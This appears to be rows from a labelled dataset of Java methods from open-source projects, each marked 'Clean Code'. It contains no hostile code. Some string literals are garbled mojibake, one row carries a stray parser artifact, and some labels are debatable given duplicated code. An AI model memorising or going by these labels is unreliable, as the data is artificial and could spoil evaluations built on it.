  result=prime * result + ((getId() == null) ? 0 : getId().hashCode());
  result=prime * result + ((getGmtCreate() == null) ? 0 : getGmtCreate().hashCode());
  result=prime * result + ((getGmtModified() == null) ? 0 : getGmtModified().hashCode());
  result=prime * result + ((getFailureId() == null) ? 0 : getFailureId().hashCode());
  result=prime * result + ((getDefId() == null) ? 0 : getDefId().hashCode());
  result=prime * result + ((getAppInstanceId() == null) ? 0 : getAppInstanceId().hashCode());
  result=prime * result + ((getAppComponentInstanceId() == null) ? 0 : getAppComponentInstanceId().hashCode());
  result=prime * result + ((getIncidentId() == null) ? 0 : getIncidentId().hashCode());
  result=prime * result + ((getName() == null) ? 0 : getName().hashCode());
  result=prime * result + ((getLevel() == null) ? 0 : getLevel().hashCode());
  result=prime * result + ((getGmtOccur() == null) ? 0 : getGmtOccur().hashCode());
  result=prime * result + ((getGmtRecovery() == null) ? 0 : getGmtRecovery().hashCode());
  result=prime * result + ((getContent() == null) ? 0 : getContent().hashCode());
  return result;
}",0,Clean Code
"private boolean maybeEatInlineListOrMap(){
  Token t=peekToken();
  if (!peekToken(TokenKind.LCURLY,true)) {
    return false;
  }
  SpelNodeImpl expr=null;
  Token closingCurly=peekToken();
  if (peekToken(TokenKind.RCURLY,true)) {
    expr=new InlineList(toPos(t.startPos,closingCurly.endPos));
  }
 else   if (peekToken(TokenKind.COLON,true)) {
    closingCurly=eatToken(TokenKind.RCURLY);
    expr=new InlineMap(toPos(t.startPos,closingCurly.endPos));
  }
 else {
    SpelNodeImpl firstExpression=eatExpression();
    if (peekToken(TokenKind.RCURLY)) {
      List<SpelNodeImpl> listElements=new ArrayList<SpelNodeImpl>();
      listElements.add(firstExpression);
      closingCurly=eatToken(TokenKind.RCURLY);
      expr=new InlineList(toPos(t.startPos,closingCurly.endPos),listElements.toArray(new SpelNodeImpl[listElements.size()]));
    }
 else     if (peekToken(TokenKind.COMMA,true)) {
      List<SpelNodeImpl> listElements=new ArrayList<SpelNodeImpl>();
      listElements.add(firstExpression);
      do {
        listElements.add(eatExpression());
      }
 while (peekToken(TokenKind.COMMA,true));
      closingCurly=eatToken(TokenKind.RCURLY);
      expr=new InlineList(toPos(t.startPos,closingCurly.endPos),listElements.toArray(new SpelNodeImpl[listElements.size()]));
    }
 else     if (peekToken(TokenKind.COLON,true)) {
      List<SpelNodeImpl> mapElements=new ArrayList<SpelNodeImpl>();
      mapElements.add(firstExpression);
      mapElements.add(eatExpression());
      while (peekToken(TokenKind.COMMA,true)) {
        mapElements.add(eatExpression());
        eatToken(TokenKind.COLON);
        mapElements.add(eatExpression());
      }
      closingCurly=eatToken(TokenKind.RCURLY);
      expr=new InlineMap(toPos(t.startPos,closingCurly.endPos),mapElements.toArray(new SpelNodeImpl[mapElements.size()]));
    }
 else {
      raiseInternalException(t.startPos,SpelMessage.OOD);
    }
  }
  this.constructedNodes.push(expr);
  return true;
}
",0,Clean Code
"private void testReads(boolean useEncryption) throws IOException {
  FakeDataSource upstreamSource=buildFakeUpstreamSource();
  CacheDataSource source=buildCacheDataSource(ApplicationProvider.getApplicationContext(),upstreamSource,useEncryption);
  testRead(END_ON_BOUNDARY,source);
  assertSingleOpen(upstreamSource,0,OFFSET_ON_BOUNDARY);
  testRead(START_OFF_BOUNDARY,source);
  assertSingleOpen(upstreamSource,OFFSET_OFF_BOUNDARY,DATA.length);
  testRead(END_OFF_BOUNDARY,source);
  assertSingleOpen(upstreamSource,OFFSET_ON_BOUNDARY,OFFSET_OFF_BOUNDARY);
  testRead(FULL,source);
  assertNoOpen(upstreamSource);
  testRead(FULL,source);
  assertNoOpen(upstreamSource);
  testRead(START_ON_BOUNDARY,source);
  assertNoOpen(upstreamSource);
  testRead(END_ON_BOUNDARY,source);
  assertNoOpen(upstreamSource);
  testRead(START_OFF_BOUNDARY,source);
  assertNoOpen(upstreamSource);
  testRead(END_OFF_BOUNDARY,source);
  assertNoOpen(upstreamSource);
}",0,Clean Code
"/** 
 * Codec and language (lower case) delimited by comma
 * @param spec codec, language
 */
public static ExoFormatItem fromAudioSpecs(String spec){
  if (spec == null) {
    return null;
  }
  String[] split=spec.split("","");
  if (split.length != 2) {
    return null;
  }
  String codec=Helpers.parseStr(split[0]);
  String language=Helpers.parseStr(split[1]);
  return from(TYPE_AUDIO,TrackSelectorManager.RENDERER_INDEX_AUDIO,null,codec,0,0,0,language,false);
}",0,Clean Code
"private void traverseClosure(Expression expr,Field field,Function<ExprSite,Boolean> func) throws IllegalAccessException, InvocationTargetException {
  Object closure=ReflectionUtils.getObjectFieldValue(expr,field);
  Preconditions.checkArgument(closure instanceof Serializable);
  Method writeReplace=ReflectionUtils.findMethods(closure.getClass(),""writeReplace"").get(0);
  writeReplace.setAccessible(true);
  SerializedLambda serializedLambda=(SerializedLambda)writeReplace.invoke(closure);
  for (int i=0; i < serializedLambda.getCapturedArgCount(); i++) {
    Object capturedArg=serializedLambda.getCapturedArg(i);
    if (capturedArg instanceof Expression || capturedArg == Expression[].class) {
      throw new IllegalStateException(String.format(""Capture expression [%s: %s] in lambda %s are not allowed. \n"" + ""SerializedLambda: %s"",capturedArg.getClass(),capturedArg,closure,serializedLambda));
    }
    if (capturedArg instanceof ExprHolder) {
      traverseMap(expr,((ExprHolder)capturedArg).getExpressionsMap(),func);
    }
  }
}",0,Clean Code
"@Test(dataProvider=""referenceTrackingConfig"") public void testOffHeap(boolean referenceTracking){
  Fury fury=Fury.builder().withLanguage(Language.JAVA).withRefTracking(referenceTracking).requireClassRegistration(false).build();
  long ptr=0;
  try {
    int size=1024;
    ptr=Platform.allocateMemory(size);
    MemoryBuffer buffer=fury.serialize(new A(),ptr,size);
    assertNull(buffer.getHeapMemory());
    Object obj=fury.deserialize(ptr,size);
    assertEquals(new A(),obj);
  }
  finally {
    Platform.freeMemory(ptr);
  }
}",0,Clean Code
"@Override public void disconnected(DisconnectedEvent event){
  geyserSession.loggingIn=false;
  String disconnectMessage, customDisconnectMessage=null;
  Throwable cause=event.getCause();
  if (cause instanceof UnexpectedEncryptionException) {
    if (geyserSession.remoteServer().authType() != AuthType.FLOODGATE) {
      customDisconnectMessage=GeyserLocale.getPlayerLocaleString(""geyser.network.remote.authentication_type_mismatch"",locale);
      geyser.getLogger().warning(GeyserLocale.getLocaleStringLog(geyser.getPlatformType() == PlatformType.STANDALONE ? ""geyser.network.remote.floodgate_explanation_standalone"" : ""geyser.network.remote.floodgate_explanation_plugin"",Constants.FLOODGATE_DOWNLOAD_LOCATION));
    }
 else {
      customDisconnectMessage=GeyserLocale.getPlayerLocaleString(""geyser.network.remote.floodgate_login_error"",locale);
      if (geyser.getPlatformType() == PlatformType.STANDALONE) {
        geyser.getLogger().warning(GeyserLocale.getLocaleStringLog(""geyser.network.remote.floodgate_login_error_standalone""));
      }
    }
  }
 else   if (cause instanceof ConnectException) {
    customDisconnectMessage=GeyserLocale.getPlayerLocaleString(""geyser.network.remote.server_offline"",locale);
  }
  disconnectMessage=customDisconnectMessage != null ? customDisconnectMessage : MessageTranslator.convertMessage(event.getReason());
  ;
  if (geyserSession.getDownstream().getSession() instanceof LocalSession) {
    geyser.getLogger().info(GeyserLocale.getLocaleStringLog(""geyser.network.remote.disconnect_internal"",geyserSession.bedrockUsername(),disconnectMessage));
  }
 else {
    geyser.getLogger().info(GeyserLocale.getLocaleStringLog(""geyser.network.remote.disconnect"",geyserSession.bedrockUsername(),geyserSession.remoteServer().address(),disconnectMessage));
  }
  if (cause != null) {
    if (cause.getMessage() != null) {
      GeyserImpl.getInstance().getLogger().error(cause.getMessage());
    }
 else {
      GeyserImpl.getInstance().getLogger().error(""An exception occurred: "",cause);
    }
    if (geyser.getConfig().isDebugMode()) {
      cause.printStackTrace();
    }
  }
  if ((!geyserSession.isClosed() && geyserSession.loggedIn) || cause != null) {
    if (customDisconnectMessage != null) {
      geyserSession.disconnect(customDisconnectMessage);
    }
 else {
      geyserSession.disconnect(event.getReason());
    }
  }
  geyserSession.loggedIn=false;
}
",0,Clean Code
"@Override public void run(){
  setSelection(mPosition,mSmooth);
  reset();
}
@Override public void run(){
  setSelection(mPosition,mSmooth);
  reset();
}
@Override public void run(){
  if (mRowsFragment == null) {
    return;
  }
  mRowsFragment.setSelectedPosition(mPosition,mSmooth);
}
@Override public void run(){
  if (mRowsSupportFragment == null) {
    return;
  }
  mRowsSupportFragment.setSelectedPosition(mPosition,mSmooth);
}
@Override public void run(){
  if (mRowsFragment == null) {
    return;
  }
  mRowsFragment.setSelectedPosition(mPosition,mSmooth);
}
@Override public void run(){
  if (mRowsSupportFragment == null) {
    return;
  }
  mRowsSupportFragment.setSelectedPosition(mPosition,mSmooth);
}
",0,Clean Code
"@Override public boolean addUserIdToTenant_Transaction(TenantIdentifier tenantIdentifier,TransactionConnection con,String userId) throws StorageQueryException, TenantOrAppNotFoundException, DuplicateEmailException, DuplicateThirdPartyUserException, DuplicatePhoneNumberException, UnknownUserIdException {
  Connection sqlCon=(Connection)con.getConnection();
  try {
    String recipeId=GeneralQueries.getRecipeIdForUser_Transaction(this,sqlCon,tenantIdentifier,userId);
    if (recipeId == null) {
      throw new UnknownUserIdException();
    }
    boolean added;
    if (recipeId.equals(""emailpassword"")) {
      added=EmailPasswordQueries.addUserIdToTenant_Transaction(this,sqlCon,tenantIdentifier,userId);
    }
 else     if (recipeId.equals(""thirdparty"")) {
      added=ThirdPartyQueries.addUserIdToTenant_Transaction(this,sqlCon,tenantIdentifier,userId);
    }
 else     if (recipeId.equals(""passwordless"")) {
      added=PasswordlessQueries.addUserIdToTenant_Transaction(this,sqlCon,tenantIdentifier,userId);
    }
 else {
      throw new IllegalStateException(""Should never come here!"");
    }
    sqlCon.commit();
    return added;
  }
 catch (  SQLException throwables) {
    SQLiteConfig config=Config.getConfig(this);
    String serverErrorMessage=throwables.getMessage();
    if (isForeignKeyConstraintError(serverErrorMessage,config.getTenantsTable(),new String[]{""app_id"",""tenant_id""},new Object[]{tenantIdentifier.getAppId(),tenantIdentifier.getTenantId()})) {
      throw new TenantOrAppNotFoundException(tenantIdentifier);
    }
    if (isUniqueConstraintError(serverErrorMessage,config.getEmailPasswordUserToTenantTable(),new String[]{""app_id"",""tenant_id"",""email""})) {
      throw new DuplicateEmailException();
    }
    if (isUniqueConstraintError(serverErrorMessage,config.getThirdPartyUserToTenantTable(),new String[]{""app_id"",""tenant_id"",""third_party_id"",""third_party_user_id""})) {
      throw new DuplicateThirdPartyUserException();
    }
    if (isUniqueConstraintError(serverErrorMessage,Config.getConfig(this).getPasswordlessUserToTenantTable(),new String[]{""app_id"",""tenant_id"",""phone_number""})) {
      throw new DuplicatePhoneNumberException();
    }
    if (isUniqueConstraintError(serverErrorMessage,Config.getConfig(this).getPasswordlessUserToTenantTable(),new String[]{""app_id"",""tenant_id"",""email""})) {
      throw new DuplicateEmailException();
    }
    throw new StorageQueryException(throwables);
  }
}
",0,Clean Code
"@Override public void onSuccess(Boolean data){
  ContactUtils.callbackOnSuccess(callback,data);
}
@Override public void onSuccess(Void data){
}
@Override public void onSuccess(List<ContactItemBean> data){
  if (data == null || data.size() != 1) {
    return;
  }
  ContactItemBean user=data.get(0);
  bean.setNickName(user.getNickName());
  bean.setId(user.getId());
  bean.setAvatarUrl(user.getAvatarUrl());
  bean.setSignature(user.getSignature());
  refreshDataSource(bean);
}
@Override public void onSuccess(Boolean data){
  bean.setBlackList(data);
  refreshDataSource(bean);
}
@Override public void onSuccess(Boolean data){
  bean.setFriend(data);
  refreshDataSource(bean);
}
@Override public void onSuccess(Boolean data){
  ContactUtils.callbackOnSuccess(callback,data);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4ae784f3@Override public void onSuccess(Void data){
  ContactUtils.callbackOnSuccess(callback,null);
}",0,Clean Code
"@Override public void onDestroy(){
  NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.locationPermissionGranted);
  NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.locationPermissionDenied);
  doNotDrawMap=true;
  if (mapViewClip != null) {
    mapViewClip.invalidate();
  }
  try {
    if (map != null) {
      map.setMyLocationEnabled(false);
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  if (mapView != null) {
    mapView.getView().setTranslationY(-AndroidUtilities.displaySize.y * 3);
  }
  try {
    if (mapView != null) {
      mapView.onPause();
    }
  }
 catch (  Exception ignore) {
  }
  try {
    if (mapView != null) {
      mapView.onDestroy();
      mapView=null;
    }
  }
 catch (  Exception ignore) {
  }
  if (adapter != null) {
    adapter.destroy();
  }
  if (searchAdapter != null) {
    searchAdapter.destroy();
  }
  parentAlert.actionBar.closeSearchField();
  ActionBarMenu menu=parentAlert.actionBar.createMenu();
  menu.removeView(searchItem);
}",0,Clean Code
"private <T>Object resolvePropertyToExample(String propertyName,Schema<T> propertySchema){
  if (JsonUtils.isCyclicSchemaReference(currentProperty,schemaRefMap,selfReferenceDepth)) {
    return null;
  }
  Object enumOrDefault=this.getEnumOrDefault(propertySchema);
  if (enumOrDefault != null) {
    return enumOrDefault;
  }
  Object generatedValueFromFormat=this.generateStringValue(propertyName,propertySchema);
  if (generatedValueFromFormat != null) {
    return generatedValueFromFormat;
  }
 else   if (propertySchema.getExample() != null && canUseExamples(propertySchema)) {
    logger.trace(""Example set in swagger spec, returning example: '{}'"",propertySchema.getExample());
    return this.formatExampleIfNeeded(propertySchema);
  }
 else   if (CatsModelUtils.isStringSchema(propertySchema)) {
    return this.getExampleFromStringSchema(propertyName,propertySchema);
  }
 else   if (CatsModelUtils.isBooleanSchema(propertySchema)) {
    return this.getExampleFromBooleanSchema();
  }
 else   if (CatsModelUtils.isArraySchema(propertySchema)) {
    return this.getExampleFromArraySchema(propertyName,propertySchema);
  }
 else   if (CatsModelUtils.isNumberSchema(propertySchema)) {
    return this.getExampleFromNumberSchema(propertySchema);
  }
 else   if (CatsModelUtils.isIntegerSchema(propertySchema)) {
    return this.getExampleFromIntegerSchema(propertySchema);
  }
 else   if (CatsModelUtils.isObjectSchema(propertySchema)) {
    return this.getExampleForObjectSchema(propertySchema);
  }
 else   if (propertySchema.getAdditionalProperties() instanceof Schema) {
    return this.getExampleFromAdditionalPropertiesSchema(propertyName,propertySchema);
  }
  return resolveProperties(propertySchema);
}
",0,Clean Code
"/** 
 * Get a stream to the file content. Depending on the service, it may or may not be read completely into memory.
 * @param filename The absolute path of the file to read.
 * @return An {@link InputStream} to the file content.
 * @throws IOException In case an error occurred while reading the file.
 */
public InputStream getFileInputStream(String filename) throws IOException {
  return new ByteArrayInputStream(readFile(filename));
}
/** 
 * Get a stream to the file content, but only if it has changed since the last time. Depending on the service, it may or may not be read completely into memory.
 * @param filename     The absolute path of the file to read.
 * @param previousSize Optional: File size of last read.
 * @param previousTime Optional: File modification time of last read.
 * @return A {@link FileResult} object holding the result.<p>The  {@link FileResult#stream} field might be {@code null} if the fileis unmodified ( {@code previousSize} and {@code previousTime} are still valid).
 * @throws IOException In case an error occurred while reading the file.
 */
public FileResult getFileInputStream(String filename,long previousSize,long previousTime) throws IOException {
  FileResult result=readFile(filename,previousSize,previousTime);
  if (result.content == null)   return result;
  return new FileResult(new ByteArrayInputStream(result.content),result.size,result.mtime);
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(diceBranchId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(rerollTimes);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(curSurfaceId);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(cheatTimes);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(hIJBOPMGBAP);
  }
  if ((bitField0_ & 0x00000020) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(gFGCPJOHMEL);
  }
  if ((bitField0_ & 0x00000040) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(curSurfaceIndex);
  }
  if ((bitField0_ & 0x00000080) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(diceBranchIdRemote);
  }
  if ((bitField0_ & 0x00000100) != 0) {
    size+=2;
  }
  if ((bitField0_ & 0x00000200) != 0) {
    size+=3;
  }
  if ((bitField0_ & 0x00000400) != 0) {
    size+=2 + ProtoSink.computeMessageSizeNoTag(diceInfo);
  }
  if ((bitField0_ & 0x00000800) != 0) {
    size+=(2 * nOGJMMEDGLL.length()) + ProtoSink.computeRepeatedUInt32SizeNoTag(nOGJMMEDGLL);
  }
  return size;
}",0,Clean Code
"public void hideTo(RoundView roundView){
  if (roundView == null) {
    destroy(false);
    return;
  }
  AndroidUtilities.cancelRunOnUIThread(stopRunnable);
  cameraView.destroy(true,null);
  if (roundView != null) {
    roundView.setDraw(false);
  }
  post(() -> {
    if (roundView.getWidth() <= 0) {
      cameraView.animate().scaleX(0).scaleY(1).withEndAction(() -> {
        if (getParent() instanceof ViewGroup) {
          ((ViewGroup)getParent()).removeView(this);
        }
      }
).start();
      return;
    }
    final float scale=(float)roundView.getWidth() / cameraView.getWidth();
    if (cameraViewAnimator != null) {
      cameraViewAnimator.cancel();
    }
    cameraViewAnimator=ValueAnimator.ofFloat(0,1);
    final float fromScale=cameraView.getScaleX();
    final float toX=(roundView.getX() + roundView.getWidth() / 2f) - (cameraView.getX() + cameraView.getWidth() / 2f);
    final float toY=(roundView.getY() + roundView.getHeight() / 2f) - (cameraView.getY() + cameraView.getHeight() / 2f);
    cameraViewAnimator.addUpdateListener(anm -> {
      final float t=(float)anm.getAnimatedValue();
      cameraView.setScaleX(AndroidUtilities.lerp(fromScale,scale,t));
      cameraView.setScaleY(AndroidUtilities.lerp(fromScale,scale,t));
      cameraView.setTranslationX(toX * t);
      cameraView.setTranslationY(toY * t);
      cameraView.setAlpha(1f - t);
      alpha=1f - t;
      invalidate();
    }
);
    cameraViewAnimator.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        if (roundView != null) {
          roundView.setDraw(true);
        }
        if (getParent() instanceof ViewGroup) {
          ((ViewGroup)getParent()).removeView(RoundVideoRecorder.this);
        }
      }
    }
);
    cameraViewAnimator.setDuration(320);
    cameraViewAnimator.setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT);
    this.roundView=roundView;
    cameraViewAnimator.start();
  }
);
}",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (getClass() != obj.getClass())   return false;
  ZhiPuAiChatOptions other=(ZhiPuAiChatOptions)obj;
  if (this.model == null) {
    if (other.model != null)     return false;
  }
 else   if (!model.equals(other.model))   return false;
  if (this.frequencyPenalty == null) {
    if (other.frequencyPenalty != null)     return false;
  }
 else   if (!this.frequencyPenalty.equals(other.frequencyPenalty))   return false;
  if (this.maxTokens == null) {
    if (other.maxTokens != null)     return false;
  }
 else   if (!this.maxTokens.equals(other.maxTokens))   return false;
  if (this.n == null) {
    if (other.n != null)     return false;
  }
 else   if (!this.n.equals(other.n))   return false;
  if (this.presencePenalty == null) {
    if (other.presencePenalty != null)     return false;
  }
 else   if (!this.presencePenalty.equals(other.presencePenalty))   return false;
  if (this.responseFormat == null) {
    if (other.responseFormat != null)     return false;
  }
 else   if (!this.responseFormat.equals(other.responseFormat))   return false;
  if (this.seed == null) {
    if (other.seed != null)     return false;
  }
 else   if (!this.seed.equals(other.seed))   return false;
  if (this.stop == null) {
    if (other.stop != null)     return false;
  }
 else   if (!stop.equals(other.stop))   return false;
  if (this.temperature == null) {
    if (other.temperature != null)     return false;
  }
 else   if (!this.temperature.equals(other.temperature))   return false;
  if (this.topP == null) {
    if (other.topP != null)     return false;
  }
 else   if (!topP.equals(other.topP))   return false;
  if (this.tools == null) {
    if (other.tools != null)     return false;
  }
 else   if (!tools.equals(other.tools))   return false;
  if (this.toolChoice == null) {
    if (other.toolChoice != null)     return false;
  }
 else   if (!toolChoice.equals(other.toolChoice))   return false;
  if (this.user == null) {
    if (other.user != null)     return false;
  }
 else   if (!this.user.equals(other.user))   return false;
  return true;
}
",0,Clean Code
"@Override @SuppressLint(""NonConstantResourceId"") public void onIconClick(int resId){
  StringBuilder sb=new StringBuilder(binding.keyword.getText().toString());
  int cursor=binding.keyword.getSelectionStart();
switch (resId) {
case R.drawable.ic_setting_home:
    callback.showDialog();
  break;
case R.drawable.ic_keyboard_left:
binding.keyword.setSelection(--cursor < 0 ? 0 : cursor);
break;
case R.drawable.ic_keyboard_right:
binding.keyword.setSelection(++cursor > binding.keyword.length() ? binding.keyword.length() : cursor);
break;
case R.drawable.ic_keyboard_back:
if (cursor == 0) return;
sb.deleteCharAt(cursor - 1);
binding.keyword.setText(sb.toString());
binding.keyword.setSelection(cursor - 1);
break;
case R.drawable.ic_keyboard_remote:
callback.onRemote();
break;
case R.drawable.ic_keyboard_search:
callback.onSearch();
break;
}
}",0,Clean Code
"private WorkflowTask generateWorkflowTask(String forkTaskName,String forkTaskType,Object forkTaskInput){
  WorkflowTask forkTask=new WorkflowTask();
  try {
    forkTask=objectMapper.convertValue(forkTaskInput,WorkflowTask.class);
  }
 catch (  Exception ignored) {
  }
  forkTask.setName(forkTaskName);
  forkTask.setType(forkTaskType);
  Map<String,Object> inputParameters=new HashMap<>();
  if (forkTaskInput instanceof Map) {
    inputParameters.putAll((Map<? extends String,?>)forkTaskInput);
  }
 else {
    inputParameters.put(""input"",forkTaskInput);
  }
  forkTask.setInputParameters(inputParameters);
  forkTask.setTaskDefinition(metadataDAO.getTaskDef(forkTaskName));
  return forkTask;
}
",0,Clean Code
"@BackendPermission(slug=BPermissionConstant.UPLOAD) @GetMapping(""/minio/merge"") @Log(title=""涓婁紶-MinIO-鏂囦欢鍚堝苟"",businessType=BusinessTypeConstant.UPLOAD) public JsonResponse minioMerge(@RequestParam HashMap<String,Object> params){
  String filename=MapUtils.getString(params,""filename"");
  String uploadId=MapUtils.getString(params,""upload_id"");
  if (filename == null || filename.trim().isEmpty()) {
    return JsonResponse.error(""filename蹇呭～"");
  }
  if (uploadId == null || uploadId.trim().isEmpty()) {
    return JsonResponse.error(""uploadId蹇呭～"");
  }
  S3Util s3Util=new S3Util(appConfigService.getS3Config());
  String url=s3Util.merge(filename,uploadId);
  HashMap<String,Object> data=new HashMap<>();
  data.put(""url"",url);
  return JsonResponse.data(data);
}",0,Clean Code
"public int getTitle(){
switch (mType) {
case VISUALIZATION_MASK:
    return R.string.hidden_connections_rules;
case MALWARE_WHITELIST:
  return R.string.malware_whitelist_rules;
case BLOCKLIST:
return R.string.firewall_rules;
case FIREWALL_WHITELIST:
return R.string.whitelist;
case DECRYPTION_LIST:
return R.string.decryption_rules;
}
assert false;
return 0;
}",0,Clean Code
"/** 
 * Loads a single parsable object.
 * @param dataSource The {@link DataSource} through which the object should be read.
 * @param parser The {@link Parser} to parse the object from the response.
 * @param uri The {@link Uri} of the object to read.
 * @param type The type of the data. One of the {@link C}{@code DATA_TYPE_*} constants.
 * @return The parsed object
 * @throws IOException Thrown if there is an error while loading or parsing.
 */
public static <T>T load(DataSource dataSource,Parser<? extends T> parser,Uri uri,int type) throws IOException {
  ParsingLoadable<T> loadable=new ParsingLoadable<>(dataSource,uri,type,parser);
  loadable.load();
  return Assertions.checkNotNull(loadable.getResult());
}
/** 
 * Loads a single parsable object.
 * @param dataSource The {@link DataSource} through which the object should be read.
 * @param parser The {@link Parser} to parse the object from the response.
 * @param dataSpec The {@link DataSpec} of the object to read.
 * @param type The type of the data. One of the {@link C}{@code DATA_TYPE_*} constants.
 * @return The parsed object
 * @throws IOException Thrown if there is an error while loading or parsing.
 */
public static <T>T load(DataSource dataSource,Parser<? extends T> parser,DataSpec dataSpec,int type) throws IOException {
  ParsingLoadable<T> loadable=new ParsingLoadable<>(dataSource,dataSpec,type,parser);
  loadable.load();
  return Assertions.checkNotNull(loadable.getResult());
}
@Override public final void load() throws IOException {
  dataSource.resetBytesRead();
  DataSourceInputStream inputStream=new DataSourceInputStream(dataSource,dataSpec);
  try {
    inputStream.open();
    Uri dataSourceUri=Assertions.checkNotNull(dataSource.getUri());
    result=parser.parse(dataSourceUri,inputStream);
  }
  finally {
    Util.closeQuietly(inputStream);
  }
}
",0,Clean Code
"/** 
 * Sets the value of an  {@code int} field in the given object instance. A class reference is not sufficient! See also {@link #findField}.
 */
public static void setIntField(Object obj,String fieldName,int value){
  try {
    findField(obj.getClass(),fieldName).setInt(obj,value);
  }
 catch (  IllegalAccessException e) {
    XposedBridge.log(e);
    throw new IllegalAccessError(e.getMessage());
  }
catch (  IllegalArgumentException e) {
    throw e;
  }
}
",0,Clean Code
"void scrollToSelection(int position,int subposition,boolean smooth,int primaryScrollExtra){
  if (TRACE)   TraceCompat.beginSection(""scrollToSelection"");
  mPrimaryScrollExtra=primaryScrollExtra;
  View view=findViewByPosition(position);
  final boolean notSmoothScrolling=!isSmoothScrolling();
  if (notSmoothScrolling && !mBaseGridView.isLayoutRequested() && view != null && getAdapterPositionByView(view) == position) {
    mFlag|=PF_IN_SELECTION;
    scrollToView(view,smooth);
    mFlag&=~PF_IN_SELECTION;
  }
 else {
    if ((mFlag & PF_LAYOUT_ENABLED) == 0 || (mFlag & PF_SLIDING) != 0) {
      mFocusPosition=position;
      mSubFocusPosition=subposition;
      mFocusPositionOffset=Integer.MIN_VALUE;
      return;
    }
    if (smooth && !mBaseGridView.isLayoutRequested()) {
      mFocusPosition=position;
      mSubFocusPosition=subposition;
      mFocusPositionOffset=Integer.MIN_VALUE;
      if (!hasDoneFirstLayout()) {
        Log.w(getTag(),""setSelectionSmooth should "" + ""not be called before first layout pass"");
        return;
      }
      position=startPositionSmoothScroller(position);
      if (position != mFocusPosition) {
        mFocusPosition=position;
        mSubFocusPosition=0;
      }
    }
 else {
      if (!notSmoothScrolling) {
        skipSmoothScrollerOnStopInternal();
        mBaseGridView.stopScroll();
      }
      if (!mBaseGridView.isLayoutRequested() && view != null && getAdapterPositionByView(view) == position) {
        mFlag|=PF_IN_SELECTION;
        scrollToView(view,smooth);
        mFlag&=~PF_IN_SELECTION;
      }
 else {
        mFocusPosition=position;
        mSubFocusPosition=subposition;
        mFocusPositionOffset=Integer.MIN_VALUE;
        mFlag|=PF_FORCE_FULL_LAYOUT;
        requestLayout();
      }
    }
  }
  if (TRACE)   TraceCompat.endSection();
}",0,Clean Code
"private void prepareAndShowDialogSigned(){
  if (getContext() == null) {
    return;
  }
  appendReturnToBackgroundVideoButton();
  appendRefreshButton();
  appendUnpinVideoFromSidebarButton();
  appendUnpinSectionFromSidebarButton();
  appendMarkAllChannelsWatchedButton();
  appendAccountSelectionButton();
  appendMoveSectionButton();
  appendRenameSectionButton();
  appendCreatePlaylistButton();
  appendToggleHistoryButton();
  appendClearHistoryButton();
  appendUpdateCheckButton();
  if (!mDialogPresenter.isEmpty()) {
    String title=mSection != null ? mSection.getTitle() : null;
    mDialogPresenter.showDialog(title,this::disposeActions);
  }
}
",0,Clean Code
"public void CommandNavigationFunctionUndo(TextPadService textpadObject,String commandNo){
switch (commandNo) {
case ""1"":
    textpadObject.display(Lines);
  break;
case ""2"":
textpadObject.display(Lines,displaystart,displayend);
break;
case ""3"":
Lines=PreviousLines;
break;
case ""4"":
Lines=PreviousLines;
break;
case ""5"":
Lines=PreviousLines;
break;
case ""6"":
cleanVars();
break;
case ""7"":
Lines=PreviousLines;
break;
}
}",0,Clean Code
"public static <T>T castStringToAny(Class<T> clazz,String val){
  if (StringUtils.isBlank(val)) {
    return null;
  }
  T ret=null;
  if (clazz == Object.class) {
    ret=clazz.cast(val);
  }
 else   if (clazz == String.class) {
    ret=clazz.cast(val);
  }
 else   if (clazz == Integer.class) {
    ret=clazz.cast(Integer.parseInt(val));
  }
 else   if (clazz == Double.class) {
    ret=clazz.cast(Double.parseDouble(val));
  }
 else   if (clazz == Float.class) {
    ret=clazz.cast(Float.parseFloat(val));
  }
 else   if (clazz == Long.class) {
    ret=clazz.cast(Long.parseLong(val));
  }
 else   if (clazz == Boolean.class) {
    ret=clazz.cast(Boolean.parseBoolean(val));
  }
  return ret;
}
",0,Clean Code
"private void raiseHand(){
  if (mConferenceState.userModel.getRole() == TUIRoomDefine.Role.GENERAL_USER) {
    RoomToast.toastShortMessageCenter(mContext.getString(R.string.tuiroomkit_toast_raised_hand));
  }
  ConferenceController.sharedInstance().takeSeat(SEAT_INDEX,TIME_OUT_60S,new TUIRoomDefine.RequestCallback(){
    @Override public void onAccepted(    String requestId,    String userId){
      if (mBottomView == null) {
        return;
      }
      mBottomView.replaceItem(BottomItemData.Type.RAISE_HAND,createRaiseHandItem());
      RoomToast.toastShortMessageCenter(mContext.getString(R.string.tuiroomkit_toast_take_seat_success));
    }
    @Override public void onRejected(    String requestId,    String userId,    String message){
      if (mBottomView == null) {
        return;
      }
      mBottomView.replaceItem(BottomItemData.Type.RAISE_HAND,createRaiseHandItem());
      RoomToast.toastShortMessageCenter(mContext.getString(R.string.tuiroomkit_toast_take_seat_rejected));
    }
    @Override public void onCancelled(    String requestId,    String userId){
      if (mBottomView == null) {
        return;
      }
      mBottomView.replaceItem(BottomItemData.Type.RAISE_HAND,createRaiseHandItem());
    }
    @Override public void onTimeout(    String requestId,    String userId){
      if (mBottomView == null) {
        return;
      }
      mBottomView.replaceItem(BottomItemData.Type.RAISE_HAND,createRaiseHandItem());
      if (mConferenceState.userModel.isOffSeat()) {
        RoomToast.toastShortMessageCenter(mContext.getString(R.string.tuiroomkit_apply_take_seat_time_out));
      }
    }
